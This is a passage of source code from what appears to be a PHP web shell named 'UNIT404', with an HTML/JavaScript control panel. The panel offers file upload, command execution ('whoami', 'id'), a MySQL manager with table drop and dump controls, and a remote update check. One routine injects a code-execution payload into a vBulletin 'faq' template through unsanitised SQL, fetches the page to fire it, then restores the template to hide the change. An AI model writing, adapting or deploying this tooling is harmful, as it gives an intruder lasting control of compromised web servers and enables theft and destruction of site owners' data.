}else{
$ff = 'http://'.$realurl.$realpath."/calendar.php";
$fff = 'http://'.$realurl.$realpath."/UNIT40409.php";
...
if(isset($_POST['UNIT4043']) && $_POST['UNIT4043']== 'vb'){
UNIT404Num(1,2,7,9,10);
...
if(isset($_POST['UNIT4044'])&&!empty($_POST['UNIT4044'])){
$method = $_POST['UNIT4048'];
$faq_name = "faq";
$faq_file = "/faq.php";
$code = "{\${".UNIT404_UPLOADER."}}{\${exit()}}&";
$conn=@mysqli_connect($_POST['UNIT4042'],$_POST['UNIT4044'],$_POST['UNIT4045'],$_POST['UNIT4047']) or die(@mysqli_connect_error());
$rec = "select `template` from ".$_POST['UNIT4046']."template WHERE title ='".$faq_name."'";
...
if(empty($savetoass)){
	...
	$getd = @mysqli_fetch_assoc($recivedata);
	$savetoass = $getd['template'];
	$code = UNIT404_UPLOADER.";";
}
$code = str_replace("'","\'",$code);
$p = "UPDATE ".$_POST['UNIT4046']."template SET `template`='".$code."' WHERE `title`='".$faq_name."'";
$ka= @mysqli_query($conn,$p) or die(mysqli_error($conn));
$geturl = @mysqli_query($conn,"select `value` from ".$_POST['UNIT4046']."setting WHERE `varname`='bburl'");
...
$check = fgets($fsock);
if(preg_match("/200 OK/i",$check)){
$p1 = "UPDATE ".$_POST['UNIT4046']."template SET template ='".mysqli_real_escape_string($conn,$savetoass)."' WHERE title ='".$faq_name."'";
...
$UNIT404Curl->Send($realurl.$realpath.$faq_file);
$p1 = "UPDATE ".$_POST['UNIT4046']."template SET template ='".mysqli_real_escape_string($conn,$savetoass)."' WHERE title ='".$faq_name."'";
$ka1= @mysqli_query($conn,$p1) or die(mysqli_error($conn));
$res = true;
}
...
function UNIT404checkupdate(){
	if($GLOBALS["DB_NAME"]["cgi_api"]){
		if(!isset($_COOKIE["UNIT404cgiapi_mode"])&&!isset($_COOKIE["UNIT404cgiapi"])){
			_UNIT404_cgicmd("whoami","perl",true);
			if(strlen(UNIT404Ex("whoami",false,true))>0){
				__UNIT404_set_cookie("UNIT404_canruncmd", "true");
			}
		}
	}
	if(function_exists("curl_version")){
		$update = new UNIT404CURL();
		$json = $update->Send("".__UNIT404_VERSION__);
		$json = @json_decode($json,true);
		$data = array();
		if($json){
			if(!isset($_COOKIE['UNIT404_checkupdate']) && !empty($json["type"])){
				if($json["type"] == "update"){
					if(__UNIT404_VERSION__ != $json['version'] || __UNIT404_UPDATE__ != $json['version_number']){
						@setcookie("UNIT404_checkupdate", "1", time()+86400);
			...
			if(isset($json["code_name"]) && !empty($json["code_name"])){
				...
				$data["version_number"] = __UNIT404_VERSION__;
			}
...
function UNIT404WriteTocgiapi($name, $source){
	return ""; // disabled - no folder creation
}
function UNIT404checkcgi(){if(strlen(UNIT404Ex("id",false,true,true))>0)echo("ok");else echo("no");}
function UNIT404updateheader(){
	if(!isset($_COOKIE["updateheader_data"])){
		...
		$tmp_path = UNIT404WriteTocgiapi("getheader.UNIT404",$bash);
		$data = UNIT404Ex("cd '{$tmp_path}/UNIT404cgiapi';sh getheader.UNIT404",false,true,true);
		if(@is_array(@json_decode($data,true))){
			__UNIT404_set_cookie("updateheader_data", __ZW5jb2Rlcg($data));
			echo $data;
		}
	}else{
...
$hash = $_POST['UNIT4042'];
if(!empty($hash)){
$hash_type = $_POST['UNIT4044'];
$email = "UNIT404kwww@gmail.com";
...
<input type='hidden' name='UNIT4041' value='uploadFile'>
<input type='hidden' name='charset' value='" . (isset($_POST['charset'])?$_POST['charset']:'') . "'>
<span class='footer_text'>Upload file: </span><span><button id='addup' onclick='addnewup();return false;'><b>+</b></button></span><p id='pfooterup'><label class='inputfile' for='footerup'><span id='__fnameup'></span> <strong>&nbsp;&nbsp;&#128193; Choose a file</strong></label><input id='footerup' class='toolsInp' type='file' name='f[]' onChange='handleup(this,0);' multiple></p><input type='submit' name='submit' value=' '></form><div id='UNIT404-copyright'><span class='copyright'>[ NeverDie &copy; 2025-".date('Y')." ]</span><br><span><a href='javascript:void(0);' onclick='' style='color:rgb(255 255 255);text-decoration: none;'>UNIT</a></span> <span style='letter-spacing: 2px;color: #ffffff;'></span> <span><a style='color: #ff0000;text-decoration: none;' target='_blank' href='https://t.me/BotFather'>404</a></span></div></td>
</tr>
</table>
</div>
...
<div id='rightclick_menu'>
  <a target='_blank' href='' name='newtab'><img src=\"https://i.gyazo.com/4134275e14c76c4cce6ab485c6485757.png\"> Open in new tab</a>
  ...
  <a href='javascript:void(0);' onclick='UNIT404SyncMenuToOpt(this);' path='' fname='' name='view_archive'><img src=\"data:image/svg+xml;base64,\"> View Archive</a>
...
<div class='cl-popup-fixed' style='display:none;'>
	<div id='shortcutMenu-holder'>
		...
		<div class='popup-foot'>
			<button style='background: #2b5225;' name='accept' action='' onclick='UNIT404PopUpDoAction(this);'></button>
			<button style='background: #9e2c2c;' onclick='d.querySelector(\".cl-popup-fixed\").style.display=\"none\";'>Cancell</button>
		</div>
	</div>
</div>";?>
<script>
function UNIT404MysqlApi(e,t){var a={host:mysql_cache[e.db_id].host,user:mysql_cache[e.db_id].user,pass:mysql_cache[e.db_id].pass,db:e.db_target,db_id:e.db_id};if(e.hasOwnProperty("db_info"))for(var i in e.db_info)a[i]=e.db_info[i];var l={a:UNIT404b64("Sql_manager_api"),c_:UNIT404b64(c_),UNIT4041:UNIT404b64(JSON.stringify(a))};if(e.hasOwnProperty("post"))for(var i in e.post.hasOwnProperty("UNIT4042")&&"load_data"!=e.post.UNIT4042&&"page"!=e.post.UNIT4042&&"edit"!=e.post.UNIT4042&&"delete"!=e.post.UNIT4042&&(d.querySelector("#"+e.db_id+" .mysql-query-result-header .mysql-query-pager").innerHTML="",d.querySelector("#"+e.db_id+" .mysql-query-result-header .mysql-query-reporter").innerHTML=""),e.post)l[i]=UNIT404b64(e.post[i]);var r="";for(var o in l)r+=o+"="+l[o]+"&";UNIT404loader(e.db_id,"block"),_Ajax(d.URL,r,function(a){UNIT404loader(e.db_id,"none"),t(a)},!0,e.db_id)}function UNIT404MysqlFilterTable(e,t){setTimeout(function(){var a="",i="",l=(a="","");if(null!=e)a=e.getAttribute("target"),i=e.getAttribute("db_id"),l=e.value;else a=t.target,i=t.db_id,l=t.value;l=new RegExp(l,"i"),d.querySelectorAll("#"+i+" "+a+" ul > li").forEach(function(e){var t=e.querySelector(".mysql_tables");if(null==t)return!1;-1==(t=t.innerText).search(l)?e.style.display="none":e.style.display="block"})},200)}function UNIT404MysqlFilterAllTable(e,t){var a=e.getAttribute("db_id"),i=d.querySelector("#"+a+" .mysql-tables input[name=filter_all]").value,l=d.querySelector("#"+a+" input[name=sql_count]").checked,r=[],o=[];if(d.querySelectorAll("#"+a+" .mysql-tables .list_container").forEach(function(e){var t=e.getAttribute("mode"),a=e.getAttribute("db_name");"no"==t&&r.push(a),o.push(a)}),r.length>0){if(0==i.length&&void 0===t)return!1;UNIT404MysqlApi({db_id:a,db_target:r[0],ajax_id:"mysql_get_all_tables",db_info:{databases:r},post:{UNIT4042:"load_all_tables",UNIT4043:l}},function(r){if(0!=r.length){for(var o in r=JSON.parse(r)){var n=o,s=d.querySelector("#"+a+" .cls-"+n);UNIT404MysqlMakeTblList(r[o],s,a,n,l)}void 0===t?UNIT404MysqlFilterTable(null,{db_id:a,target:".mysql-tables .list_container",value:i}):(e.setAttribute("mode","opened"),d.querySelector("#"+a+" .mysql-tables .parent-expander img").src="data:image/png;base64,")}})}else if(void 0===t)for(var n in UNIT404MysqlFilterTable(null,{db_id:a,target:".mysql-tables .list_container",value:i}),o)UNIT404MysqlTableMode(a,o[n],"closed");else{var s="",c=e.getAttribute("mode");for(var n in"opened"==c?(e.setAttribute("mode","closed"),s="b_plus.png"):(e.setAttribute("mode","opened"),s="b_minus.png"),o)UNIT404MysqlTableMode(a,o[n],c);d.querySelector("#"+a+" .mysql-tables .parent-expander img").src="https://hcklst.pages.dev/menu_icon.webp"+s}}function UNIT404MysqlTableMode(e,t,a){var i=d.querySelector("#"+e+" .cls-"+t),l="";void 0===a?(l=-1!=i.classList.value.indexOf("hide-db-tables")?"b_minus.png":"b_plus.png",i.classList.toggle("hide-db-tables")):"opened"==a?(l="b_plus.png",i.classList.add("hide-db-tables")):(l="b_minus.png",i.classList.remove("hide-db-tables")),d.querySelector("#"+e+" .cls-"+t+"-expander img").src="https://hcklst.pages.dev/menu_icon.webp"+l}function UNIT404MysqlExpander(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=e.getAttribute("sql_count"),l=d.querySelector("#"+a+" .cls-"+t);"loaded"==l.getAttribute("mode")?UNIT404MysqlTableMode(a,t):UNIT404MysqlApi({db_id:a,db_target:t,ajax_id:"mysql_get_tables",post:{UNIT4042:"load_tables",UNIT4043:i}},function(e){0!=e.length&&UNIT404MysqlMakeTblList(e=JSON.parse(e),l,a,t,i)})}function UNIT404MysqlTablesEvil(e){var t=e.getAttribute("target"),a=e.getAttribute("db_id"),i=e.getAttribute("mode");"checked"==i?(i=!1,e.setAttribute("mode","not")):(i=!0,e.setAttribute("mode","checked")),d.querySelectorAll("#"+a+" "+t+" input[name=tbl\\[\\]]").forEach(function(e){e.checked=i})}function UNIT404MysqlTablesDumpDrop(e){var t=e.getAttribute("target"),a=e.getAttribute("db_id"),i="none";"dump"==e.value&&(i="block"),d.querySelector("#"+a+" "+t+" .dump-file-holder").style.display=i}function UNIT404MysqlTablesDumpDropBtn(e){var t=e.getAttribute("target"),a=e.getAttribute("db_target"),i=e.getAttribute("db_id"),l=[],r=d.querySelector("#"+i+" input[name=sql_count]").checked,o=d.querySelector("#"+i+" "+t),n=o.querySelector("select[name=tables_evil]").value,s=o.querySelector(".dump-file-holder input").value;d.querySelectorAll("#"+i+" "+t+" input[name=tbl\\[\\]]").forEach(function(e){e.checked&&l.push(e.value)}),l.length>0&&UNIT404MysqlApi({db_id:i,db_target:a,ajax_id:"mysql_query_evil",db_info:{tables:l,mode:n,dump_file:s},post:{UNIT4042:"dump_drop"}},function(e){0!=e.length&&(e=JSON.parse(e),"drop"==n?UNIT404MysqlMakeTblList(e,o,i,a,r):o.querySelector(".dump-file-holder").insertAdjacentHTML("beforeend","<div><a href='javascript:void(0);' onclick='g(\"FilesTools\",null,\""+s+'","download");\'><span>Download: '+s+"</span></a></div>"))})}function UNIT404MysqlMakeTblList(e,t,a,i,l){t.setAttribute("mode","loaded");var r='<ul><li><div class="block"><i></i><b></b></div><div><input style="padding: 0;margin-left: 11px;text-align:center;" type="text" class="db-opt-id" db_id="'+a+'" placeholder="Filter Table" target=".cls-'+i+'" onkeyup="UNIT404MysqlFilterTable(this);" name="filter"></div></li>';for(var o in e)null!=e[o]&&(r+="<li><div class='block'><i></i><b></b></div><div class='tables-row'><input type='checkbox' name='tbl[]' value='"+e[o].name+"'>&nbsp;<a class='db-opt-id' db_target='"+i+"' db_id='"+a+"' href='javascript:void(0);' onclick=\"UNIT404LoadTableData(this, '"+e[o].name+"')\"><span class='mysql_tables' style='font-weight:unset;'>"+e[o].name+"</span></a>"+(l?" <small><span style='font-weight:unset;' class='mysql_table_count'>("+e[o].count+")</span></small>":"&nbsp;")+"</div></li>");r+='</ul><div style="margin-left: 26px;margin-bottom: 10px;margin-top: 10px;"><input onchange="UNIT404MysqlTablesEvil(this);" db_id="'+a+'" class="db-opt-id" target=".cls-'+i+'" type="checkbox" class="db-opt-id"><select onchange="UNIT404MysqlTablesDumpDrop(this);" class="db-opt-id" db_id="'+a+'" target=".cls-'+i+'" class="db-opt-id" name="tables_evil" style="padding: 0;width: 100px;"><option selected>drop</option><option>dump</option></select> <button onclick="UNIT404MysqlTablesDumpDropBtn(this);return false;" db_id="'+a+'" class="db-opt-id" db_target="'+i+'" target=".cls-'+i+'" class="db-opt-id">Do it</button><div class="dump-file-holder" style="display:none;margin-left:20px;margin-top: 5px;"><input style="padding: 0;text-align:center;" type="text" placeholder="dump.sql" name="dump_file"></div></div>',t.innerHTML=r,d.querySelector("#"+a+" .cls-"+i+"-expander img").src="data:image/png;base64,"}function UNIT404MysqlQuery(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=d.querySelector("#"+a+" textarea[name=query]").value;UNIT404MysqlApi({db_id:a,db_target:t,ajax_id:"mysql_load_query_data",db_info:{query:i},post:{UNIT4042:"query"}},function(e){0!=e.length&&(e=JSON.parse(e),UNIT404MysqlReportBuilder(a,e),d.querySelector("#"+a+" .mysql-query-table").innerHTML=e.status?e.table:"",UNIT404MysqlTabCtl({child:1,db_id:a,target:".mysql-query-result-content"},!0))})}function UNIT404MysqlReportBuilder(e,t){var a="";t.status||(a="<div><span>Error: </span><div style='padding-left: 50px;'><pre>"+t.error+"</pre></div></div>");var i="<div><span>Query:</span><div style='padding-left: 50px;'><pre>"+t.query+"</pre></div>"+a+"</div>";d.querySelector("#"+e+" .mysql-query-reporter").innerHTML=i}function UNIT404MysqlTablePanelCtl(e){var t=e.getAttribute("db_id"),a=(t=e.getAttribute("db_id"),d.querySelector("#"+t)),i=a.querySelector(".tables-panel-ctl");"none"==i.getAttribute("mode")?(a.querySelector(".mysql-tables").style.display="block",i.setAttribute("mode","block"),i.innerHTML="&#x3C;&#x3C;",a.querySelector(".mysql-query-results-fixed").classList.remove("mysql-query-results-fixed")):(a.querySelector(".mysql-tables").style.display="none",i.setAttribute("mode","none"),i.innerHTML="&#x3E;&#x3E;",a.querySelector(".mysql-query-results").classList.add("mysql-query-results-fixed")),i.classList.toggle("tables-panel-ctl-min")}function UNIT404MysqlTabCtl(e,t){var a=void 0===t?e.getAttribute("db_id"):e.db_id,i=void 0===t?e.getAttribute("target"):e.target;d.querySelectorAll("#"+a+" .mysql-query-content").forEach(function(e){e.classList.add("mysql-hide-content")}),d.querySelector("#"+a+" .mysql-query-result-tabs .mysql-query-selected-tab").classList.remove("mysql-query-selected-tab"),void 0===t?e.classList.add("mysql-query-selected-tab"):d.querySelector("#"+a+" .mysql-query-result-tabs div:nth-child("+e.child+")").classList.add("mysql-query-selected-tab"),d.querySelector("#"+a+" "+i).classList.remove("mysql-hide-content")}function UNIT404LoadTableData(e,t){var a=e.getAttribute("db_target"),i=e.getAttribute("db_id");UNIT404MysqlApi({db_id:i,db_target:a,ajax_id:"mysql_load_table_data",db_info:{table:t},post:{UNIT4042:"load_data"}},function(e){if(0!=e.length){e=JSON.parse(e);var l="",r="<table border='1'><tr style='text-align: left;background-color: #305b8e;color:#000000;'><th>Column</th><th>Type</th><th>Value</th></tr>",o="<table border='1'><tr style='text-align: left;background-color: #305b8e;color:#000000;'><th>Column</th><th>Type</th><th>Value</th><th>Change</th></tr>",n="<table border='1'><tr style='text-align: left;background-color: #305b8e;color:#000000;'><th>Column</th><th>Type</th><th>Collation</th><th>Operator</th><th>Value</th></tr>",s=["int","smallint","bigint","tinyint","mediumint"],c=["longtext","text","mediumtext","tinytext"];for(var u in e.columns){var p="text";-1!=s.indexOf(e.columns[u].data_type)&&(p="number"),n+="<tr><th style='text-align: left;'>"+e.columns[u].name+"</th><td>"+e.columns[u].type+"</td><td>"+e.columns[u].collation+"</td><td><select name='"+e.columns[u].name+"'><option value='='>=</option><option value='!='>!=</option><option value='>'>&gt;</option><option value='>='>&gt;=</option><option value='<'>&lt;</option><option value='<='>&lt;=</option><option value=\"= ''\">= ''</option><option value=\"!= ''\">!= ''</option><option value='LIKE'>LIKE</option><option value='LIKE %...%'>LIKE %...%</option><option value='NOT LIKE'>NOT LIKE</option><option value='REGEXP'>REGEXP</option><option value='REGEXP ^...$'>REGEXP ^...$</option><option value='NOT REGEXP'>NOT REGEXP</option><option value='IN (...)'>IN (...)</option><option value='NOT IN (...)'>NOT IN (...)</option><option value='BETWEEN'>BETWEEN</option><option value='NOT BETWEEN'>NOT BETWEEN</option><option value='IS NULL'>IS NULL</option><option value='IS NOT NULL'>IS NOT NULL</option></select></td><td><input type='"+p+"' name='"+e.columns[u].name+"'></td></tr>";var f=UNIT404MysqlLoadDataType(e.columns[u].data_type);null==e.columns[u].type_value&&(e.columns[u].type_value=""),o+="<tr><th style='text-align: left;'>"+e.columns[u].name+"</th><td><select name='sel_"+e.columns[u].name+"'>"+f+"</select></td><td><input name='value_"+e.columns[u].name+"' type='text' value='"+(-1==c.indexOf(e.columns[u].data_type)?e.columns[u].type_value:"")+"'></td><td><button col_name='"+e.columns[u].name+"' tbl_name='"+t+"' db_id='"+i+"' db_target='"+a+"' onclick='UNIT404MysqlAlterTbl(this);return false;'>Change</button></td></tr>";var m="";switch(e.columns[u].data_type){case"longtext":case"text":m="<textarea name='"+e.columns[u].name+"' rows='5'></textarea>";break;case"int":case"smallint":case"bigint":m="<input type='number' name='"+e.columns[u].name+"' value=''>";break;default:m="<input type='text' name='"+e.columns[u].name+"' value=''>"}r+="<tr><th style='text-align: left;'>"+e.columns[u].name+"</th><td>"+e.columns[u].type+"</td><td>"+m+"</td></tr>"}if(r+="</table><div style='margin-left:20px;'><button tbl_name='"+t+"' db_id='"+i+"' db_target='"+a+"' onclick='UNIT404MysqlUpdateRow(this, \"insert\");return false;'>Insert</button></div><div class='mysql-insert-result'></div>",o+="</table><div class='mysql-structure-qres'></div>",n+="</table><div style='padding-left: 384px;margin-top: 15px;'><button tbl_name='"+t+"' db_id='"+i+"' db_target='"+a+"' onclick='UNIT404MysqlSearch(this);return false;'>Search</button></div>",e.pages>0){l+="<span style='cursor:pointer;' db_id='"+i+"' onclick='UNIT404MysqlChangePage(this,1);'><<</span> <span> page: </span> <select tbl_name='"+t+"' db_target='"+a+"' name='mysql-q-pages' db_id='"+i+"' class='db-opt-id' onchange='UNIT404MysqlChangePage(this);' pages='"+e.pages+"'>";for(var b=1;b<e.pages+1;b++)l+="<option>"+b+"</option>";l+="</select><span> Of "+e.pages+"</span> <span style='cursor:pointer;' db_id='"+i+"' onclick='UNIT404MysqlChangePage(this,2);'>>></span>"}var y=d.querySelector("#"+i);y.querySelector(".mysql-search-area").innerHTML=n,y.querySelector(".mysql-insert-row").innerHTML=r,y.querySelector(".mysql-edit-row").innerHTML="",y.querySelector(".mysql-structure").innerHTML=o,y.querySelector(".mysql-query-result-header .mysql-query-pager").innerHTML=l,y.querySelector(".mysql-query-table").innerHTML=e.status?e.table:"",UNIT404MysqlTabCtl({child:1,db_id:i,target:".mysql-query-result-content"},!0),d.querySelector("#"+i+" .mysql-query-result-tabs div:nth-child(6)").style.display="none",UNIT404MysqlReportBuilder(i,e)}})}function UNIT404MysqlAlterTbl(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=d.querySelector("#"+a),l=e.getAttribute("tbl_name"),r=e.getAttribute("col_name"),o={};o.type=i.querySelector(".mysql-structure select[name=sel_"+r+"]").value,o.input=i.querySelector(".mysql-structure input[name=value_"+r+"]").value,UNIT404MysqlApi({db_id:a,db_target:t,ajax_id:"mysql_table_alter",db_info:{table:l,column:r,alter:o},post:{UNIT4042:"alter"}},function(e){var t=d.querySelector("#"+a+" .mysql-structure-qres");t.innerHTML=e,t.style.display="block"})}function UNIT404MysqlSearch(e){var t=e.getAttribute("db_target"),a=e.getAttribute("db_id"),i=d.querySelector("#"+a),l=e.getAttribute("tbl_name"),r={};i.querySelectorAll(".mysql-search-area input, .mysql-search-area select").forEach(function(e){r.hasOwnProperty(e.name)||(r[e.name]={}),"SELECT"==e.tagName?r[e.name].opt=e.value:r[e.name].value=e.value}),UNIT404MysqlApi({db_id:a,db_target:t,ajax_id:"mysql_table_search_query",db_info:{table:l,search:r},post:{UNIT4042:"search"}},function(e){0!=e.length&&(e=JSON.parse(e),UNIT404MysqlReportBuilder(a,e),UNIT404MysqlTabCtl({child:1,db_id:a,target:".mysql-query-result-content"},!0),d.querySelector("#"+a+" .mysql-query-table").innerHTML=e.table)})}function UNIT404MysqlEditRow(e,t){var a=e.getAttribute("db_target"),i=e.getAttribute("db_id"),l=(d.querySelector("#"+i),e.getAttribute("col_key")),r=e.getAttribute("key"),o=e.getAttribute("tbl_name"),n=e.getAttribute("row_id");UNIT404MysqlApi({db_id:i,db_target:a,ajax_id:"mysql_table_edit_query",db_info:{table:o,col_key:l,key:r},post:{UNIT4042:t}},function(e){if(0!=e.length)if(e=JSON.parse(e),"edit"==t){var s="<table border='1'><tr style='text-align: left;background-color: #305b8e;color:#000000;'><th>Column</th><th>Type</th><th>Value</th></tr>";for(var c in e){var u="";switch(e[c].type.tag){case"textarea":u="<textarea name='"+e[c].col+"' rows='5'>"+e[c].value+"</textarea>";break;case"input":u="<input type='"+e[c].type.type+"' name='"+e[c].col+"' value='"+e[c].value+"'>"}s+="<tr><th style='text-align: left;'>"+e[c].col+"</th><td>"+e[c].type.col_type+"</td><td>"+u+"</td></tr>"}s+="</table><div style='margin-left:20px;'><button col_key='"+l+"' key='"+r+"' tbl_name='"+o+"' db_id='"+i+"' db_target='"+a+"' onclick='UNIT404MysqlUpdateRow(this, \"edit\");return false;'>Update</button></div><div class='mysql-update-result'></div>",d.querySelector("#"+i+" .mysql-edit-row").innerHTML=s,UNIT404MysqlTabCtl({child:6,db_id:i,target:".mysql-edit-row"},!0),d.querySelector("#"+i+" .mysql-query-result-tabs div:nth-child(6)").style.display="inline-block"}else"delete"==t&&(e.status?d.querySelector("#"+i+" .tbl_row_l"+n).remove():alert(e.error))})}function UNIT404MysqlTblSelectAll(e){var t=e.getAttribute("db_id");d.querySelectorAll("#"+t+" .mysql-main input[name=tbl_rows_checkbox\\[\\]]").forEach(function(t){t.checked=e.checked})}function UNIT404MysqlDeleteAllSelectedrows(e){var t=e.getAttribute("db_id"),a=e.getAttribute("db_target"),i=e.getAttribute("col_key"),l=e.getAttribute("tbl_name"),r=[];if(d.querySelectorAll("#"+t+" .mysql-main input[name=tbl_rows_checkbox\\[\\]]").forEach(function(e){e.checked&&r.push(e.value)}),0==r.length)return!1;UNIT404MysqlApi({db_id:t,db_target:a,ajax_id:"mysql_table_delete_all_query",db_info:{table:l,col_key:i,rows:r},post:{UNIT4042:"delete_all"}},function(e){if(""!=e)if((e=JSON.parse(e)).status){var a=0,i=d.querySelector("#"+t);d.querySelectorAll("#"+t+" .mysql-main input[name=tbl_rows_checkbox\\[\\]]").forEach(function(e){e.checked&&(a=e.getAttribute("row_id"),i.querySelector(".tbl_row_l"+a).remove())})}else alert(e.error)})}function UNIT404MysqlUpdateRow(e,t){var a=e.getAttribute("db_target"),i=e.getAttribute("db_id"),l=d.querySelector("#"+i),r=".mysql-insert-row",o=".mysql-insert-result",n="mysql_table_insert_query",s="insert",c={table:e.getAttribute("tbl_name")};if("edit"==t){var u=e.getAttribute("col_key"),p=e.getAttribute("key");r=".mysql-edit-row",o=".mysql-update-result",n="mysql_table_update_query",s="update",c.col_key=u,c.key=p}var f={};l.querySelectorAll(r+" input, "+r+" textarea").forEach(function(e){f.hasOwnProperty(e.name)||(f[e.name]={}),f[e.name]=e.value}),c.data=f,UNIT404MysqlApi({db_id:i,db_target:a,ajax_id:n,db_info:c,post:{UNIT4042:s}},function(e){if(0!=e.length){e=JSON.parse(e);var t=d.querySelector("#"+i+" "+o);t.style.display="block",e.status?t.innerHTML="Success...":t.innerHTML=e.error}})}function UNIT404MysqlLoadDataType(e){e=e.toUpperCase();var t=["INT","VARCHAR","TEXT","DATE",{key:"Numeric",vals:["TINYINT","SMALLINT","MEDIUMINT","INT","BIGINT","-","DECIMAL","FLOAT","DOUBLE","REAL","-","BIT","BOOLEAN","SERIAL"]},{key:"Date and time",vals:["DATE","DATETIME","TIMESTAMP","TIME","YEAR"]},{key:"String",vals:["CHAR","VARCHAR","-","TINYTEXT","TEXT","MEDIUMTEXT","LONGTEXT","-","BINARY","VARBINARY","-","TINYBLOB","MEDIUMBLOB","BLOB","LONGBLOB","-","ENUM","SET"]},{key:"Spatial",vals:["GEOMETRY","POINT","LINESTRING","POLYGON","MULTIPOINT","MULTILINESTRING","MULTIPOLYGON","GEOMETRYCOLLECTION"]},{key:"JSON",vals:["JSON"]}],a="",i=!1;for(var l in t)if("object"==typeof t[l]){for(var r in a+='<optgroup label="'+t[l].key+'">',t[l].vals)a+="<option"+(t[l].vals[r]!=e||i?"":" selected")+">"+t[l].vals[r]+"</option>",t[l].vals[r]==e&&(i=!0);a+="</optgroup>"}else a+="<option"+(t[l]!=e||i?"":" selected")+">"+t[l]+"</option>",t[l]==e&&(i=!0);return a}function UNIT404MysqlChangePage(e,t){var a=e.getAttribute("db_id"),i=0;if(void 0!==t){e=d.querySelector("#"+a+" select[name=mysql-q-pages]");var l=parseInt(e.getAttribute("pages"));if(i=parseInt(e.value),1==t?--i:++i,0==i||l<i)return!1;e.value=i}else i=e.value;var r=e.getAttribute("db_target"),o=e.getAttribute("tbl_name");UNIT404MysqlApi({db_id:a,db_target:r,ajax_id:"mysql_table_change_page",db_info:{table:o,page:i},post:{UNIT4042:"page"}},function(e){0!=e.length&&(e=JSON.parse(e),UNIT404MysqlReportBuilder(a,e),d.querySelector("#"+a+" .mysql-query-table").innerHTML=e.table)})}function UNIT404RemoveCookie(e){document.cookie=e+"=;Max-Age=0; path=/;"}function UNIT404LogOut(){UNIT404RemoveCookie("UNIT404User"),UNIT404RemoveCookie("UNIT404Pass"),location.reload()}var UNIT404AlertBox=function(e,t){this.types={success:{class:"alert-success",icon:"http://hcklst.pages.dev/check-mark.png"},error:{class:"alert-error",icon:"https://hcklst.pages.dev/warning_icon.png"}},this.show=function(a){if(""===a||null==a)throw'"msg parameter is empty"';var i=document.querySelector(e),l=document.createElement("DIV"),r=document.createElement("DIV"),o=document.createElement("DIV"),n=document.createElement("A"),s=document.createElement("div"),c=document.createElement("IMG"),d=this;if(s.style.display="inline-block",s.style.marginRight="10px",r.style.display="inline-block",o.classList.add("alert-content"),o.innerText=a,n.classList.add("alert-close"),n.setAttribute("href","#"),l.classList.add("alert-box"),c.src=this.types[t.type].icon,c.style.width="30px",s.appendChild(c),l.appendChild(s),t.hasOwnProperty("title")){var u=document.createElement("DIV");u.classList.add("alert-content-title"),u.innerText=t.title,r.appendChild(u)}if(r.appendChild(o),l.appendChild(r),t.hideCloseButton&&void 0!==t.hideCloseButton||l.appendChild(n),t.hasOwnProperty("type")&&l.classList.add(this.types[t.type].class),i.appendChild(l),n.addEventListener("click",function(e){e.preventDefault(),d.hide(l)}),!t.persistent)var p=setTimeout(function(){d.hide(l),clearTimeout(p)},t.closeTime)},this.hide=function(e){e.classList.add("hide");var t=setTimeout(function(){e.parentNode.removeChild(e),clearTimeout(t)},500)}};function UNIT404ShowNotification(e,t,a,i,l){void 0===a&&(a="success"),void 0===i&&(i=!1),void 0===l&&(l=1e4);var r={closeTime:l,persistent:i,type:a,hideCloseButton:!1};void 0!==t&&(r.title=t),new UNIT404AlertBox("#alert-area",r).show(e)}function UNIT404SyncMenuToOpt(e,t){var a="",i="",l=null;void 0!==t?(a="view_archive",i=e,l=location):(a=e.name,i=e.getAttribute("fname"),l=e),"extract"==a?(UNIT404_can_add_opt=!0,l.href="#action=options&path="+c_+"&opt=deziper",g("deziper",null,"","",c_+"/"+i),d.querySelector(".opt-title").innerHTML="DeCompressor"):"compress"==a?(UNIT404_can_add_opt=!0,l.href="#action=options&path="+c_+"&opt=ziper",g("ziper",null,"","",c_+"/"+i),d.querySelector(".opt-title").innerHTML="Compressor"):"view_archive"==a&&(UNIT404_can_add_opt=!0,l.href="#action=options&path="+c_+"&opt=archive_manager",g("archive_manager",null,"",c_+"/"+i,""),d.querySelector(".opt-title").innerHTML="Archive Manager")}function doFilterName(e){var t="#filesman_holder_"+UNIT404_current_fm_id;setTimeout(function(){var a=new RegExp(e.value,"i");d.querySelectorAll(t+" .fmanager-row").forEach(function(e){-1==e.querySelector(".main_name").getAttribute("fname").search(a)?e.style.display="none":e.style.display="table-row"})},100)}function sortBySelectedValue(e,t){setCookie(t,e.options[e.selectedIndex].value,2012),g("FilesMan",c_)}function loadPopUpDatabase(e,t,a){if(console.log(t),$("database_window").style.display="block",void 0===t){try{d.querySelector(".sql-content.sql-active-content").classList.remove("sql-active-content")}catch(e){}try{d.querySelector(".sql-tabname.sql-active-tab").classList.remove("sql-active-tab")}catch(e){}try{d.querySelector(".sql-tabs .sql-newtab").remove()}catch(e){}var i="id_db_"+getRandom(10);d.querySelector("#database_window .content_options_holder .sql-contents").insertAdjacentHTML("afterbegin",'<div id="'+i+'" class="sql-content sql-active-content">'+e+"</div>"),d.querySelector("#database_window .content_options_holder .sql-tabs").insertAdjacentHTML("beforeend",'<div id="tab_'+i+'" opt_id="'+i+'" class="sql-tabname sql-active-tab" onclick="dbTabController(this);"><span style="font-weight:unset;">New DB Connection</span> <span opt_id="'+i+'" onclick="closeDatabase(this,event);return false;" title="[close]" style="cursor:pointer;color:#ff4444;font-weight:bold;font-size:14px;margin-left:5px;">X</span></div><div class="sql-newtab" onclick="UNIT404_can_add_opt=true;g(\'sql\',null,\'\',\'\',\'\');" style="background-color:#ffffff;"><span style="font-weight:unset;">New Tab +</span></div>'),$(i).querySelectorAll(".db-opt-id").forEach(function(e){e.setAttribute("db_id",i)});try{$(i).querySelector(".getconfig").setAttribute("base_id",i)}catch(e){}return i}$(t).innerHTML=e;var l=$("tab_"+t);null!=l&&((-1==l.classList.value.indexOf("sql-active-tab")||database_window_is_minimized)&&(l.classList.add("tab-is-done"),UNIT404ShowNotification("proccess is done...","DB: "+l.innerText)),database_window_is_minimized&&UNIT404UpdateOptionsBadge("database_window")),void 